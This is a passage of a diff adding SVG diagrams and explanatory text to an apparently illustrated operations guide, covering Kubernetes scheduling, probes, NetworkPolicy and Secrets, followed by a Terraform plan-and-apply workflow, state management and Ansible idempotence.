+        <rect x="580" y="180" width="790" height="200" fill="var(--z2)"/>
+        <text x="596" y="202" class="s-zone" fill="var(--mute)">Nodes · kubelet starts containers and reports health</text>
+        <rect x="596" y="214" width="244" height="152" fill="var(--paper)" stroke="var(--rule)"/>
+        <rect x="856" y="214" width="244" height="152" fill="var(--paper)" stroke="var(--rule)"/>
+        <rect x="1116" y="214" width="238" height="152" fill="var(--paper)" stroke="var(--hazard)" stroke-width="2" stroke-dasharray="7 5"/>
+        <g class="s-lab" font-size="10.5"><text x="606" y="232">node 1</text><text x="866" y="232">node 2</text><text x="1126" y="232" fill="var(--hazard)">node 3 · NotReady</text></g>
+        <g fill="var(--z1)" stroke="var(--line)" stroke-width="2"><rect x="608" y="242" width="100" height="40"/><rect x="722" y="242" width="100" height="40"/><rect x="868" y="242" width="100" height="40"/></g>
+        <rect x="982" y="242" width="104" height="40" fill="var(--z4)" stroke="var(--fast)" stroke-width="2" stroke-dasharray="5 4"/>
+        <g fill="var(--band)" stroke="var(--mute)" stroke-width="1.5" stroke-dasharray="4 3"><rect x="1128" y="242" width="100" height="40"/><rect x="1240" y="242" width="100" height="40"/></g>
+        <g class="s-lab" font-size="10.5"><text x="618" y="258">pod api</text><text x="732" y="258">pod api</text><text x="878" y="258">pod api</text><text x="992" y="258" fill="var(--fast)">pod api (new)</text><text x="1138" y="258" fill="var(--mute)">pod worker</text><text x="1250" y="258" fill="var(--mute)">pod worker</text></g>
+        <g class="s-sub" font-size="9.5"><text x="618" y="274">Ready ✓</text><text x="732" y="274">Ready ✓</text><text x="878" y="274">Ready ✓</text><text x="992" y="274" fill="var(--fast)">starting…</text><text x="1138" y="274">rescheduling</text><text x="1250" y="274">rescheduling</text></g>
+        <text x="606" y="304" class="s-num">06</text>
+        <g class="s-sub" font-size="10"><text x="628" y="304">requests: 250m CPU, 512Mi</text><text x="628" y="318">limits: 500m CPU, 512Mi</text><text x="606" y="340">the scheduler reserved exactly</text><text x="606" y="354">this much when it placed them</text></g>
+        <g class="s-sub" font-size="10"><text x="866" y="304">readiness not passed yet,</text><text x="866" y="318">so the Service sends it nothing</text><text x="866" y="340">the old pod is removed only</text><text x="866" y="354">after this one is Ready</text></g>
+        <g class="s-sub" font-size="10"><text x="1126" y="304">kubelet stopped reporting;</text><text x="1126" y="318">pods move to nodes 1 and 2</text><text x="1126" y="340" fill="var(--hazard)">Pending pods → the autoscaler</text><text x="1126" y="354" fill="var(--hazard)">adds a node, in minutes</text></g>
+
+        <!-- TRAFFIC -->
+        <rect x="580" y="394" width="790" height="146" fill="var(--z1)"/>
+        <text x="596" y="416" class="s-zone" fill="var(--line)">Traffic · from outside in</text>
+        <g fill="var(--paper)" stroke="var(--line)" stroke-width="2">
+          <rect x="596" y="430" width="130" height="48"/><rect x="750" y="430" width="130" height="48"/><rect x="904" y="430" width="130" height="48"/><rect x="1058" y="430" width="130" height="48"/>
+        </g>
+        <rect x="1212" y="430" width="142" height="48" fill="var(--paper)" stroke="var(--hazard)" stroke-width="2"/>
+        <g stroke="var(--line)" stroke-width="2.5" fill="none" marker-end="url(#k1)"><path d="M726,454 L746,454"/><path d="M880,454 L900,454"/><path d="M1034,454 L1054,454"/></g>
+        <g class="s-lab" font-size="11"><text x="606" y="450">internet → LB</text><text x="760" y="450">07 · Ingress</text><text x="914" y="450">08 · Service</text><text x="1068" y="450">Ready pods</text><text x="1222" y="450" fill="var(--hazard)">09 · NetworkPolicy</text></g>
+        <g class="s-sub" font-size="10"><text x="606" y="468">one cloud balancer</text><text x="760" y="468">TLS, host + path</text><text x="914" y="468">stable IP + DNS name</text><text x="1068" y="468">endpoints, per conn.</text><text x="1222" y="468" fill="var(--hazard)">default: all-to-all</text></g>
+        <text x="596" y="510" class="s-haz" font-size="10.5">Namespaces are a naming and permissions boundary — not a network boundary.</text>
+        <text x="596" y="526" class="s-sub" font-size="10.5" style="fill:var(--hazard)">A compromised frontend can reach your database pod unless a default-deny policy per namespace says no.</text>
+
+        <!-- REQUESTS AND LIMITS -->
+        <rect x="30" y="556" width="540" height="204" fill="var(--z5)"/>
+        <text x="46" y="580" class="s-zone" fill="var(--fast)">10 · requests and limits</text>
+        <text x="46" y="598" class="s-sub">requests decide WHERE a pod lands · limits decide what happens under pressure</text>
+        <text x="46" y="626" class="s-lab" font-size="11">CPU</text>
+        <rect x="90" y="614" width="380" height="18" fill="var(--paper)" stroke="var(--rule)"/>
+        <rect x="90" y="614" width="150" height="18" fill="var(--line)" opacity=".8"/>
+        <rect x="240" y="614" width="110" height="18" fill="var(--line)" opacity=".35"/>
+        <rect x="350" y="614" width="40" height="18" fill="var(--fast)" opacity=".5"/>
+        <line x1="350" y1="606" x2="350" y2="640" stroke="var(--fast)" stroke-width="2.5"/>
+        <text x="480" y="627" class="s-note" font-size="10.5">throttled</text>
+        <text x="90" y="652" class="s-sub" font-size="10.5">request 250m · limit 500m. Past the limit the kernel pauses you: slow, alive.</text>
+        <text x="46" y="684" class="s-lab" font-size="11">RAM</text>
+        <rect x="90" y="672" width="380" height="18" fill="var(--paper)" stroke="var(--rule)"/>
+        <rect x="90" y="672" width="260" height="18" fill="var(--line)" opacity=".8"/>
+        <rect x="350" y="672" width="30" height="18" fill="var(--hazard)" opacity=".6"/>
+        <line x1="350" y1="664" x2="350" y2="698" stroke="var(--hazard)" stroke-width="2.5"/>
+        <text x="480" y="685" class="s-haz" font-size="10.5">OOMKilled</text>
+        <text x="90" y="710" class="s-sub" font-size="10.5">request = limit = 512Mi. One byte over and the pod dies: exit code 137.</text>
+        <text x="46" y="732" class="s-note" font-size="11">A pod restarting under load is usually an unnoticed OOMKill, not a bug.</text>
+        <text x="46" y="750" class="s-sub" font-size="10.5">Latency unexplained? Check container_cpu_cfs_throttled_seconds_total first.</text>
+
+        <!-- PROBES -->
+        <rect x="590" y="556" width="780" height="204" fill="var(--z4)"/>
+        <text x="606" y="580" class="s-zone" fill="var(--mute)">11 · probes — running is not the same as working</text>
+        <g class="s-lab" font-size="11"><text x="606" y="608">startup</text><text x="606" y="636">readiness</text><text x="606" y="664">liveness</text></g>
+        <g class="s-sub"><text x="700" y="608">has it finished booting?</text><text x="700" y="636">can it serve traffic now?</text><text x="700" y="664">is the process wedged?</text></g>
+        <g class="s-sub" style="fill:var(--ink)"><text x="920" y="608">gives slow starters time before the others begin</text><text x="920" y="636">controls Service membership: no traffic until it passes</text><text x="920" y="664">controls restarts — and must check nothing else</text></g>
+        <text x="606" y="696" class="s-haz">Never make liveness depend on the database.</text>
+        <text x="606" y="714" class="s-sub" style="fill:var(--hazard)">A brief database blip then restarts every pod at once: a degradation becomes an outage, and recovery is blocked.</text>
+        <text x="606" y="738" class="s-sub">Liveness equal to readiness is the same mistake. Too aggressive, and a GC pause or slow start gets pods killed.</text>
+
+        <!-- BOTTOM -->
+        <rect x="30" y="780" width="440" height="120" fill="var(--z1)"/>
+        <text x="46" y="802" class="s-zone" fill="var(--line)">12 · a bad release, stopped</text>
+        <g fill="var(--line)" opacity=".8"><rect x="46" y="816" width="26" height="26"/><rect x="78" y="816" width="26" height="26"/><rect x="110" y="816" width="26" height="26"/></g>
+        <rect x="150" y="816" width="26" height="26" fill="var(--paper)" stroke="var(--hazard)" stroke-width="2" stroke-dasharray="4 3"/>
+        <text x="163" y="834" text-anchor="middle" class="s-haz" font-size="12">×</text>
+        <text x="196" y="826" class="s-sub">one new pod at a time; old pods</text>
+        <text x="196" y="840" class="s-sub">stay until the new one is Ready</text>
+        <text x="46" y="866" class="s-haz" font-size="10.5">readiness never passes → the rollout simply stops</text>
+        <text x="46" y="884" class="s-sub">users never saw it · rollout undo, or revert the Git commit</text>
+
+        <rect x="490" y="780" width="440" height="120" fill="var(--z3)"/>
+        <text x="506" y="802" class="s-zone" fill="var(--hazard)">13 · a Secret is base64, not encryption</text>
+        <text x="506" y="822" class="s-sub">readable by anyone with get secrets · sits in etcd, encrypt it</text>
+        <g class="s-mono" font-size="10"><text x="506" y="842">External Secrets Operator + Vault / AWS SM</text><text x="506" y="858">sealed-secrets or SOPS → safe to commit</text></g>
+        <text x="506" y="880" class="s-note" font-size="10.5">best: IRSA / Workload Identity — no secret exists</text>
+
+        <rect x="950" y="780" width="420" height="120" fill="var(--band)"/>
+        <text x="966" y="802" class="s-zone" fill="var(--mute)">14 · do you actually need it?</text>
+        <text x="966" y="822" class="s-sub">yes: many services, many teams, a platform team to own it</text>
+        <text x="966" y="838" class="s-sub">no: 3 services and 8 developers → ECS Fargate or a PaaS</text>
+        <text x="966" y="860" class="s-haz" font-size="10.5">Its fixed cost does not shrink with your workload:</text>
+        <text x="966" y="876" class="s-sub" style="fill:var(--hazard)">upgrades, CNI, ingress, RBAC, certificates, operators.</text>
+        <text x="966" y="892" class="s-sub">Managed control plane only: etcd is not your product.</text>
+      </svg>
+    </div>
+    <figcaption><b>Think thermostat, not light switch.</b> You write down 21°C and a loop measures, compares and acts forever. That is why everything is YAML rather than commands, why GitOps fits so naturally — the repository is where the temperature is written — and why a wrong number in that YAML is obeyed as faithfully as a right one.</figcaption>
+  </figure>
+
+  <div class="gaz">
+    <h3>Step key — the loop and the objects it moves</h3>
+    <div class="gazgrid">
+      <div><h4><span>01</span>Desired state</h4><p>A declaration — this image, this many replicas, reachable at this address — stored through the API server. With Argo CD or Flux the declaration lives in Git, and the commit history is the deployment history.</p></div>
+      <div><h4><span>02</span>Observe</h4><p>Kubelets report pod and node health continuously. A node that stops reporting is marked NotReady; nothing waits for a human to notice.</p></div>
+      <div><h4><span>03</span>Compare</h4><p>Each controller diffs the declaration against reality for its kind of object. Any difference — a lost pod, a new image tag, a changed replica count — is work to do.</p></div>
+      <div><h4><span>04</span>Act</h4><p>Create or delete pods, start a new ReplicaSet for a rolling update, add nodes when pods are Pending. Then observe again. The loop never finishes.</p></div>
+      <div><h4><span>05</span>Control plane</h4><p>api-server, etcd, scheduler and controllers. Use a managed one: running etcd yourself is a specialised skill with no product value, and etcd dislikes large objects and churn.</p></div>
+      <div><h4><span>06</span>Pod and Deployment</h4><p>A pod is one or more containers sharing a network namespace; you rarely create one. A Deployment manages identical pods and their rolling updates. With Service, Ingress, ConfigMap and Secret, it covers most workloads.</p></div>
+      <div><h4><span>07</span>Ingress</h4><p>One load balancer with host- and path-based routing and TLS termination. Gateway API is the successor and where the ecosystem is moving.</p></div>
+      <div><h4><span>08</span>Service</h4><p>A stable virtual IP and DNS name in front of a changing set of pods. Pod IPs are ephemeral; only Ready pods are in its endpoints.</p></div>
+      <div><h4><span>09</span>NetworkPolicy</h4><p>Which pods may talk to which. The default is everything, across namespaces. Adopt default-deny per namespace and allow explicitly — the usual gap between a working cluster and a defensible one.</p></div>
+      <div><h4><span>10</span>Requests and limits</h4><p>CPU over the limit is throttled in 100 ms periods; memory over the limit is OOMKilled. Set memory request equal to limit, CPU requests honestly, and be wary of tight CPU limits on latency-sensitive services.</p></div>
+      <div><h4><span>11</span>Probes</h4><p>Startup protects slow boots, readiness controls traffic, liveness controls restarts. Liveness answers "is this process broken?" only; dependency awareness belongs in readiness, carefully.</p></div>
+      <div><h4><span>12</span>Rolling update</h4><p>New pods are added one at a time and old ones removed only once the new one is Ready. A release whose readiness never passes stops by itself, with the old version still serving.</p></div>
+      <div><h4><span>13</span>Secrets</h4><p>Base64 in etcd, readable with get secrets. Use an external store, sealed-secrets or SOPS — and better, pod identity (IRSA, Workload Identity) so there is no secret to leak. Never mount service account tokens that are not needed.</p></div>
+      <div><h4><span>14</span>Fit</h4><p>Transformative for many services, many teams and a platform team; a persistent tax for a small team. The failure mode is rarely the technology — it is an unowned cluster nobody upgrades.</p></div>
+    </div>
+  </div>
+
+  <div class="warn">
+    <b>The defaults are permissive</b>
+    <p>A service account token mounted into every pod, all-to-all pod networking, Secrets readable across a namespace, no resource limits. Assume an application compromise will happen and configure the cluster so it stays inside one namespace: least-privilege RBAC with no cluster-admin for apps or CI, default-deny networking, the restricted Pod Security Standard, and audit logs shipped off-cluster.</p>
+  </div>
+</div>
+
+<!-- ══════════════════════ SHEET 6 — BLUEPRINT AND INVENTORY ══════════════════════ -->
+<div class="sheet" id="a6">
+  <div class="plate">
+    <span class="no">Sheet 6</span>
+    <h2>Blueprint and Inventory</h2>
+    <span class="form">Process plant</span>
+    <span class="cov">Covers · Terraform · Ansible · CI CD</span>
+  </div>
+  <p class="thesis">The ground everything else lands on: networks, databases, clusters, machines. It changes rarely, and it must change through the same reviewed route as code. <strong>Terraform's plan is the feature — a diff of infrastructure before it happens — and its state file is both the reason it works and the source of nearly every incident. Ansible's equivalent promise is idempotence: run it twice, change nothing.</strong></p>
+
+  <figure>
+    <div class="scroll">
+      <svg class="wide" viewBox="0 0 1400 910" role="img" aria-label="A process plant for infrastructure. Along the top, seven stages of a Terraform change: edit the code, format and validate, plan to a saved file with a read-only role, scan and comment on the pull request, review the plan, apply the saved plan with a locked OIDC role, and update the state. Below left, a triangle of the three things that must agree: code, state file and reality. Below middle, how to read plan symbols, including destroy-and-recreate. Below right, how to lay out state per environment and why state is secret. Along the bottom, which tool owns which layer, Ansible idempotence compared with shell commands, and two ways to configure machines: baking an image with Packer, or running playbooks over SSH against an existing fleet.">
+        <defs>
+          <marker id="t1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="var(--line)"/></marker>
+        </defs>
+
+        <text x="40" y="42" class="s-zone" fill="var(--line)">The plan line · every infrastructure change takes this route; none is clicked in a console</text>
+        <g>
+          <rect x="40" y="60" width="166" height="72" fill="var(--z2)" stroke="var(--rule)"/>
+          <rect x="232" y="60" width="166" height="72" fill="var(--z2)" stroke="var(--rule)"/>
+          <rect x="424" y="60" width="166" height="72" fill="var(--z4)" stroke="var(--fast)" stroke-width="2.5"/>
+          <rect x="616" y="60" width="166" height="72" fill="var(--z2)" stroke="var(--rule)"/>
+          <rect x="808" y="60" width="166" height="72" fill="var(--z2)" stroke="var(--rule)"/>
+          <rect x="1000" y="60" width="166" height="72" fill="var(--z4)" stroke="var(--fast)" stroke-width="2.5"/>
+          <rect x="1192" y="60" width="166" height="72" fill="var(--z1)" stroke="var(--line)" stroke-width="2.5"/>
+        </g>
+        <g stroke="var(--line)" stroke-width="3" fill="none" marker-end="url(#t1)">
+          <path d="M206,96 L228,96"/><path d="M398,96 L420,96"/><path d="M590,96 L612,96"/><path d="M782,96 L804,96"/><path d="M974,96 L996,96"/><path d="M1166,96 L1188,96"/>
+        </g>
+        <g class="s-num"><text x="52" y="80">01</text><text x="244" y="80">02</text><text x="436" y="80">03</text><text x="628" y="80">04</text><text x="820" y="80">05</text><text x="1012" y="80">06</text><text x="1204" y="80">07</text></g>
+        <g class="s-lab"><text x="80" y="80">edit the code</text><text x="272" y="80">fmt, validate</text><text x="464" y="80">plan</text><text x="656" y="80">scan, comment</text><text x="848" y="80">review the plan</text><text x="1040" y="80">apply tfplan</text><text x="1232" y="80">state updated</text></g>
+        <g class="s-sub" font-size="10.5">
+          <text x="52" y="102">envs/prod/main.tf:</text><text x="52" y="116">add a read replica</text>
+          <text x="244" y="102">syntax and types,</text><text x="244" y="116">no API calls at all</text>
+          <text x="436" y="102">plan -out=tfplan with</text><text x="436" y="116">a read-only role</text>
+          <text x="628" y="102">Checkov, tfsec; plan</text><text x="628" y="116">posted on the PR</text>
+          <text x="820" y="102">look for -/+ first,</text><text x="820" y="116">then approve</text>
+          <text x="1012" y="102">OIDC apply role, lock,</text><text x="1012" y="116">the reviewed plan only</text>
+          <text x="1204" y="102">S3, versioned, encrypted;</text><text x="1204" y="116">lock released</text>
+        </g>
+        <text x="40" y="156" class="s-haz" font-size="10.5">Stop 06 applies the saved plan. Re-planning at apply time reopens the window for a change nobody reviewed — including someone else's concurrent one.</text>
+        <text x="40" y="172" class="s-sub">Stops 02 to 07 run in CI, never on a laptop. The history of this line is the change record an auditor asks for.</text>
+
+        <!-- TRIANGLE -->
+        <rect x="30" y="190" width="530" height="370" fill="var(--z3)"/>
+        <text x="46" y="214" class="s-zone" fill="var(--mute)">08 · three things that must agree</text>
+        <g stroke="var(--line)" stroke-width="2.5" fill="none"><path d="M270,292 L150,452"/><path d="M320,292 L440,452"/><path d="M226,480 L364,480"/></g>
+        <rect x="205" y="240" width="180" height="52" fill="var(--z1)" stroke="var(--line)" stroke-width="2.5"/>
+        <rect x="46" y="452" width="180" height="56" fill="var(--paper)" stroke="var(--fast)" stroke-width="2.5"/>
+        <rect x="364" y="452" width="180" height="56" fill="var(--paper)" stroke="var(--line)" stroke-width="2.5"/>
+        <g class="s-lab"><text x="217" y="262">your code</text><text x="58" y="474" fill="var(--fast)">the state file</text><text x="376" y="474">reality</text></g>
+        <g class="s-sub" font-size="10.5"><text x="217" y="280">.tf files, reviewed in Git</text><text x="58" y="494">address → real resource ID</text><text x="376" y="494">what the cloud API reports</text></g>
+        <g class="s-sub" font-size="10.5"><text x="196" y="366" text-anchor="end">plan compares</text><text x="196" y="380" text-anchor="end">code with state</text><text x="394" y="366">apply calls the</text><text x="394" y="380">provider's API</text></g>
+        <text x="295" y="470" text-anchor="middle" class="s-sub" font-size="10.5" style="fill:var(--hazard)">drift =</text>
+        <text x="295" y="498" text-anchor="middle" class="s-sub" font-size="10.5" style="fill:var(--hazard)">they differ</text>
+        <text x="295" y="394" text-anchor="middle" class="s-mono" font-size="10.5">aws_instance.web</text>
+        <text x="295" y="410" text-anchor="middle" class="s-mono" font-size="10.5" style="fill:var(--fast)">→ i-0abc123</text>
+        <text x="46" y="534" class="s-sub">Every Terraform problem is two of these disagreeing. Lose the state</text>
+        <text x="46" y="548" class="s-sub">and it cannot tell an existing building from an empty plot.</text>
+
+        <!-- PLAN SYMBOLS -->
+        <rect x="576" y="190" width="384" height="370" fill="var(--z4)"/>
+        <text x="592" y="214" class="s-zone" fill="var(--fast)">09 · reading a plan</text>
+        <g fill="var(--paper)" stroke="var(--rule)"><rect x="592" y="226" width="56" height="28"/><rect x="592" y="262" width="56" height="28"/><rect x="592" y="298" width="56" height="28" stroke="var(--hazard)"/><rect x="592" y="334" width="56" height="28" stroke="var(--hazard)" stroke-width="2.5"/></g>
+        <g class="s-big" text-anchor="middle"><text x="620" y="246" fill="var(--line)">+</text><text x="620" y="282" fill="var(--fast)">~</text><text x="620" y="318" fill="var(--hazard)">-</text><text x="620" y="354" fill="var(--hazard)">-/+</text></g>
+        <g class="s-lab" font-size="11"><text x="662" y="238">create</text><text x="662" y="274">update in place</text><text x="662" y="310" fill="var(--hazard)">destroy</text><text x="662" y="346" fill="var(--hazard)">destroy and recreate</text></g>
+        <g class="s-sub" font-size="10.5"><text x="662" y="252">+ aws_db_instance.replica</text><text x="662" y="288">~ one security group ingress rule</text><text x="662" y="324">it is gone</text><text x="662" y="360">the one to look for, every time</text></g>
+        <text x="592" y="392" class="s-haz">-/+ on a database or load balancer is an outage.</text>
+        <text x="592" y="408" class="s-sub" font-size="10.5">Some attributes cannot change in place, so the provider</text>
+        <text x="592" y="422" class="s-sub" font-size="10.5">replaces the resource. Not reckless — literal.</text>
+        <text x="592" y="448" class="s-lab" font-size="11">10 · lifecycle { prevent_destroy = true }</text>
+        <text x="592" y="464" class="s-sub" font-size="10.5">on databases, state buckets, anything irreplaceable</text>
+        <text x="592" y="490" class="s-lab" font-size="11">11 · a rename is not a replacement</text>
+        <text x="592" y="506" class="s-sub" font-size="10.5">renamed in code → destroy plus create. A moved block</text>
+        <text x="592" y="520" class="s-sub" font-size="10.5">tells Terraform it is the same resource.</text>
+        <text x="592" y="544" class="s-note" font-size="10.5">the plan goes empty; nothing is rebuilt</text>
+
+        <!-- STATE -->
+        <rect x="976" y="190" width="394" height="370" fill="var(--z1)"/>
+        <text x="992" y="214" class="s-zone" fill="var(--line)">12 · state: remote, locked, secret</text>
+        <g class="s-mono" font-size="10.5">
+          <text x="992" y="238">infra/</text>
+          <text x="992" y="254">  modules/network  modules/service</text>
+          <text x="992" y="270">  envs/staging → s3://tf-state/staging</text>
+          <text x="992" y="286">  envs/prod    → s3://tf-state/prod</text>
+          <text x="992" y="302">  bootstrap/   → the state bucket</text>
+        </g>
+        <text x="992" y="328" class="s-lab" font-size="11">one state per environment and blast radius</text>
+        <text x="992" y="344" class="s-sub" font-size="10.5">a staging mistake cannot touch production; plans</text>
+        <text x="992" y="358" class="s-sub" font-size="10.5">stay fast; split by rate of change: network, data, app</text>
+        <text x="992" y="384" class="s-haz">The state holds secrets in plaintext.</text>
+        <text x="992" y="400" class="s-sub" font-size="10.5" style="fill:var(--hazard)">Marked sensitive or not. Never in Git; an encrypted</text>
+        <text x="992" y="414" class="s-sub" font-size="10.5" style="fill:var(--hazard)">bucket in an account CI cannot administer.</text>
+        <text x="992" y="440" class="s-lab" font-size="11">13 · no workspaces for environments</text>
+        <text x="992" y="456" class="s-sub" font-size="10.5">one config, one key namespace: easy to apply</text>
+        <text x="992" y="470" class="s-sub" font-size="10.5">staging's plan to production. Use directories.</text>
+        <text x="992" y="496" class="s-lab" font-size="11">DynamoDB lock</text>
+        <text x="992" y="512" class="s-sub" font-size="10.5">two concurrent applies wait instead of corrupting</text>
+        <text x="992" y="534" class="s-sub" font-size="10.5">A 5-minute plan means split the state — not -target,</text>
+        <text x="992" y="548" class="s-sub" font-size="10.5">which leaves state matching no reviewed plan.</text>
+
+        <!-- ANSIBLE BAND -->
+        <text x="40" y="596" class="s-zone" fill="var(--fast)">Inside the machine · Terraform owns the resource, Ansible owns what is inside it</text>
+
+        <rect x="30" y="610" width="440" height="290" fill="var(--band)"/>
+        <text x="46" y="634" class="s-zone" fill="var(--mute)">Who owns which layer</text>
+        <g fill="var(--paper)" stroke="var(--rule)">
+          <rect x="46" y="646" width="410" height="40" stroke="var(--fast)" stroke-width="2"/><rect x="46" y="692" width="410" height="40" stroke="var(--fast)" stroke-width="2"/>
+          <rect x="46" y="738" width="410" height="40"/><rect x="46" y="784" width="410" height="40"/><rect x="46" y="830" width="410" height="40"/>
+        </g>
+        <g class="s-lab" font-size="11"><text x="56" y="662">14 · Terraform</text><text x="56" y="708">15 · Ansible (or Packer + Ansible)</text><text x="56" y="754">Dockerfile</text><text x="56" y="800">Kubernetes</text><text x="56" y="846">CI/CD + a rollout strategy</text></g>
+        <g class="s-sub" font-size="10"><text x="56" y="677">cloud resources: network, database, IAM, instances</text><text x="56" y="723">inside a machine: packages, users, files, services</text><text x="56" y="769">inside a container: runtime, dependencies, app</text><text x="56" y="815">where containers run, heal and scale</text><text x="56" y="861">getting a new version live, and back</text></g>
+        <g class="s-num" text-anchor="end"><text x="446" y="662">this sheet</text><text x="446" y="708">this sheet</text><text x="446" y="754">sheet 4</text><text x="446" y="800">sheet 5</text><text x="446" y="846">sheets 1, 7</text></g>
+        <text x="46" y="890" class="s-haz" font-size="10.5">Each is bad at the others' jobs — found out late.</text>
+
+        <rect x="490" y="610" width="440" height="290" fill="var(--z2)"/>
+        <text x="506" y="634" class="s-zone" fill="var(--mute)">16 · idempotence is the point</text>
+        <text x="506" y="656" class="s-lab" font-size="11" style="fill:var(--line)">declarative — correct</text>
+        <text x="716" y="656" class="s-lab" font-size="11" style="fill:var(--hazard)">shell in YAML</text>
+        <g class="s-mono" font-size="10"><text x="506" y="676">apt: nginx present</text><text x="506" y="692">service: nginx started</text><text x="716" y="676">shell: apt-get install</text><text x="716" y="692">shell: echo … &gt;&gt; conf</text></g>
+        <text x="506" y="718" class="s-note" font-size="10.5">run twice → changed=0</text>
+        <text x="716" y="718" class="s-haz" font-size="10.5">run twice → appends twice</text>
+        <g class="s-sub" font-size="10.5"><text x="506" y="734">handlers fire on real change</text><text x="716" y="734">always reports changed</text></g>
+        <g class="s-sub" font-size="10.5"><text x="506" y="760">Every shell or command task is a small hole: check mode</text><text x="506" y="774">becomes meaningless and handlers fire wrongly. If you</text><text x="506" y="788">must, add creates:, removes: or changed_when:.</text></g>
+        <text x="506" y="814" class="s-lab" font-size="11">17 · defaults/, not vars/</text>
+        <g class="s-sub" font-size="10.5"><text x="506" y="830">overridable settings go in defaults/ (low precedence);</text><text x="506" y="844">vars/ sits near the top and fights every override.</text></g>
+        <text x="506" y="870" class="s-lab" font-size="11">18 · three settings, over 2× faster</text>
+        <text x="506" y="886" class="s-sub" font-size="10.5">pipelining = True · forks 5 → 50 · gathering = smart</text>
+
+        <rect x="950" y="610" width="420" height="290" fill="var(--z4)"/>
+        <text x="966" y="634" class="s-zone" fill="var(--fast)">19 · bake the image</text>
+        <text x="966" y="656" class="s-lab" font-size="10.5" style="fill:var(--line)">better: configure the image, not the server</text>
+        <g fill="var(--paper)" stroke="var(--line)" stroke-width="2"><rect x="966" y="666" width="88" height="44"/><rect x="1066" y="666" width="88" height="44"/><rect x="1166" y="666" width="88" height="44"/><rect x="1266" y="666" width="88" height="44"/></g>
+        <g stroke="var(--line)" stroke-width="2" fill="none" marker-end="url(#t1)"><path d="M1054,688 L1063,688"/><path d="M1154,688 L1163,688"/><path d="M1254,688 L1263,688"/></g>
+        <g class="s-lab" font-size="10.5"><text x="974" y="684">Packer +</text><text x="1074" y="684">golden AMI</text><text x="1174" y="684">launch</text><text x="1274" y="684">ASG rolls</text></g>
+        <g class="s-sub" font-size="10"><text x="974" y="700">Ansible role</text><text x="1074" y="700">tested image</text><text x="1174" y="700">template</text><text x="1274" y="700">instances</text></g>
+        <text x="966" y="730" class="s-sub" font-size="10.5">no SSH into production · no drift · rollback = the previous AMI</text>
+        <text x="966" y="756" class="s-lab" font-size="10.5">or, for fleets that already exist</text>
+        <rect x="966" y="766" width="150" height="52" fill="var(--paper)" stroke="var(--fast)" stroke-width="2"/>
+        <text x="976" y="786" class="s-lab" font-size="11">control node</text>
+        <text x="976" y="804" class="s-sub" font-size="10">in CI, not a laptop</text>
+        <g stroke="var(--line)" stroke-width="1.5" fill="none"><path d="M1116,780 L1150,777"/><path d="M1116,804 L1150,809"/><path d="M1214,777 L1222,777"/><path d="M1286,777 L1294,777"/><path d="M1214,809 L1222,809"/></g>
+        <g fill="var(--z1)" stroke="var(--line)"><rect x="1150" y="766" width="64" height="22"/><rect x="1222" y="766" width="64" height="22"/><rect x="1294" y="766" width="64" height="22"/><rect x="1150" y="798" width="64" height="22"/><rect x="1222" y="798" width="64" height="22"/></g>
+        <g class="s-mono" font-size="10" text-anchor="middle"><text x="1182" y="781">web-1</text><text x="1254" y="781">web-2</text><text x="1326" y="781">web-3</text><text x="1182" y="813">db-1</text><text x="1254" y="813">cache-1</text></g>
+        <text x="966" y="840" class="s-sub" font-size="10.5">dynamic inventory · --check --diff first · the handler</text>
+        <text x="966" y="854" class="s-sub" font-size="10.5">restarts nginx once per host, only where it changed</text>
+        <text x="966" y="874" class="s-haz" font-size="10.5">20 · the control node is root on your whole fleet</text>
+        <text x="966" y="890" class="s-sub" font-size="10.5" style="fill:var(--hazard)">Vault for secrets, no_log: true, a dedicated key per env</text>
+      </svg>
+    </div>
+    <figcaption><b>A blueprint and an inventory.</b> The code says what should exist; the state records what was built and which brick is which; the plan is the comparison. Move a wall by hand and the inventory is wrong — that is drift, visible as an unexpected <b>~</b> on the next plan. Ansible works the same checklist from inside the machine, and is at its best producing the image you replace machines with.</figcaption>
+  </figure>
+
+  <div class="gaz">
+    <h3>Step key — the plant and its vocabulary</h3>
+    <div class="gazgrid">
+      <div><h4><span>01</span>Edit the code</h4><p>Infrastructure is declared in HCL and lives in Git. OpenTofu is the open-source fork after the 2023 licence change; everything here applies to both.</p></div>
+      <div><h4><span>02</span>fmt and validate</h4><p>Canonical formatting and syntax and type checking, with no API calls. Cheap, fast, and the first gate on every pull request.</p></div>
+      <div><h4><span>03</span>Plan to a file</h4><p>plan -out=tfplan with a read-only role shows exactly what would change. Being able to see "this will destroy the database" before it happens is why Terraform won.</p></div>
+      <div><h4><span>04</span>Scan and comment</h4><p>Checkov or tfsec catch public buckets and open security groups before they exist; the plan is posted as a PR comment so reviewers read the effect, not just the code.</p></div>
+      <div><h4><span>05</span>Review the plan</h4><p>Read every plan for -/+ before anything else. A long plan hides a replacement easily, and review is where it is cheapest to catch.</p></div>
+      <div><h4><span>06</span>Apply the reviewed plan</h4><p>CI assumes a scoped per-environment apply role via OIDC, takes the lock and applies the saved file. What was approved is exactly what happens.</p></div>
+      <div><h4><span>07</span>State updated</h4><p>Written back to a versioned, encrypted bucket, then the lock is released. Versioning is what lets you recover from a corrupted state.</p></div>
+      <div><h4><span>08</span>Code, state, reality</h4><p>State maps resource addresses to real IDs. Without it Terraform cannot tell "create a new one" from "this already exists". Drift is reality disagreeing with state: codify the change or revert it, deliberately.</p></div>
+      <div><h4><span>09</span>Plan symbols</h4><p>+ create, ~ update in place, - destroy, -/+ destroy and recreate. A plan on unchanged code should say no changes; anything else is drift worth investigating.</p></div>
+      <div><h4><span>10</span>prevent_destroy</h4><p>A lifecycle rule that makes apply fail rather than destroy the resource. Put it on databases, state buckets and anything whose replacement would be catastrophic.</p></div>
+      <div><h4><span>11</span>moved blocks</h4><p>Renaming a resource in code looks like destroy plus create. A moved block (or state mv) tells Terraform it is the same object, and the plan goes empty.</p></div>
+      <div><h4><span>12</span>Remote locked state</h4><p>Remote, locked, versioned, encrypted, treated as secret — from day one. Local state on a laptop is the beginning of every Terraform horror story: two engineers, two states, one environment.</p></div>
+      <div><h4><span>13</span>Separate states</h4><p>One state per environment and blast radius, in separate directories with separate backends. Workspaces share configuration and make applying staging's plan to production easy.</p></div>
+      <div><h4><span>14</span>Terraform's job</h4><p>Anything with a provider and a lifecycle: networks, clusters, databases, DNS, IAM, even GitHub branch protection. Not the inside of servers, and not application rollouts.</p></div>
